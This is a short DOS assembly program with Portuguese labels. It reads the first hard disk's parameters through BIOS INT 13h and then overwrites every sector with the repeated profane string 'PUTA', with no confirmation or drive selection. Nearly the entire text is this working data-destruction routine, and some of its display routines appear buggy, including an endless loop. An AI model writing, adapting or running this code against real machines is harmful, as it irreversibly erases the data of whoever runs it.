org 100h
call GetDiskPar
;push es
CALL INTRO
CALL SHOW_MAX_SECTOR
CALL QUEBRA_DE_LINHA
Start:
;CALL SHOW_CURRENT_SECTOR
mov eax,4000h
mov es,ax
es
cmp dword[10h],0
jle End1
call WipeHDD
mov eax,60H
ss
add dword[SETOR],eax
es
mov eax,60H
ss
add dword[SECTOR2],eax
es
sub dword[10h],60H
jmp Start
End1:
;pop es
CALL ENDING
ret
WipeHDD:
mov eax,'PUTA'
mov ecx,3000H
push es
mov esi,4000h
mov es,si
mov edi,600h
rep stosd
pop es
mov al,10h
mov si,300h
mov al,10h
mov [si],al
mov al,0h
mov [si+1],al
mov al,60H
mov [si+2],al
mov al,0h
mov [si+3],al
mov ax,600h
mov [si+4],ax
mov ax,4000h
mov [si+6],ax
ss
mov eax,[SETOR]  ;SETOR A SER GRAVADO
mov [si+8],eax
xor ax,ax
mov [si+0ch],ax
mov [si+0eh],ax
mov ah,43h
mov dl,80h
INT 13h
ret

GetDiskPar:
mov ah,48h
mov dl,80h
push ds
mov bx,4000h
mov ds,bx
xor si,si
INT 13h
pop ds
ret

SHOW_MAX_SECTOR:
JMP FIM
SECTORS:
MOV SI,4
LABEL1:
MOV DL,[DS:BP+0]
AND DL,0F0H
MOV AH,2H
MOV CL,4
SHR DL,CL
ADD DL,30H
CMP DL,3AH
JL INT21
ADD DL,7
INT21:
INT 21H
MOV AH,2
MOV DL,[DS:BP+0]
AND DL,0FH
ADD DL,30H
CMP DL,3AH
JL INTDOS
ADD DL,7
INTDOS:
INT 21H
DEC SI
DEC BP
CMP SI,0
JNZ LABEL1
POP DS
RET
FIM:
CALL GetDiskPar
PUSH DS
MOV AX,4000h
MOV DS,AX
MOV BP,13H
JMP SECTORS
SHOW_CURRENT_SECTOR:
JMP FIM2
SECTORS2:
MOV SI,4
LABEL2:
MOV DL,[DS:EBP+0]
AND DL,0F0H
MOV AH,2H
MOV CL,4
SHR DL,CL
ADD DL,30H
CMP DL,3AH
JL INT21_
ADD DL,7
INT21_:
INT 21H
MOV AH,2
MOV DL,[DS:EBP+0]
AND DL,0FH
ADD DL,30H
CMP DL,3AH
JL INTDOS2
ADD DL,7
INTDOS2:
INT 21H
DEC SI
DEC EBP
CMP SI,0
JNZ LABEL2
POP DS
FIM2:
MOV EBP,SECTOR2
JMP SECTORS2
RET
SPACE:
MOV AH,2
MOV DL,20h
INT 21h
RET
SETOR DD 0
SECTOR2 DD 0
INTRO:
MOV AH,9
MOV DX,INTROS
INT 21H
RET
ENDING:
MOV AH,9
MOV DX,ENDINGS
INT 21h
RET
QUEBRA_DE_LINHA:

MOV AH,9
MOV DX,NEWL
INT 21h
RET

INTROS DB "TOTAL DE SETORES PARA SEREM WIPEDS: $",13,10,0
ENDINGS DB "DISCO WIPED$",0
NEWL DB 13,10,"$"
